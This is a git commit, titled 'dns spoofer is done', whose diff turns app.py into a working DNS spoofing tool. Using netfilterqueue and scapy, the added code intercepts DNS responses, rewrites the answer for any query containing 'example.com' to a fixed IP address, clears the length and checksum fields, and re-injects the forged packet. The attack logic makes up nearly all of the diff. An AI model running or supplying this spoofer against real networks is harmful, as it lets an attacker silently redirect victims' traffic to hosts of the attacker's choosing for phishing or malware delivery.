cea1482df1e61ffbfa95de68ac0bac3968e180de
Angelo <madhav1004@icloud.com>
2021-01-11 22:06:34 +0530

    dns spoofer is done

--- app.py
+++ app.py
@@ -1,8 +1,28 @@
 import netfilterqueue
+import scapy.all as scapy
 
 
 def process_packet(packet):
-    print(packet)
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy.DNSRR in scapy_packet:
+        # it is dns spoof
+        domain = 'example.com'
+        if domain in scapy_packet[scapy.DNSQR].qname:
+            # got the website doom
+            print "[+] Spoofing packet"
+
+            answer = scapy.DNSRR(rrname=scapy_packet[scapy.DNSQR].qname, rdata="198.143.141.69")
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
+
+            packet.set_payload(str(scapy_packet))
+
     packet.accept()
 
 
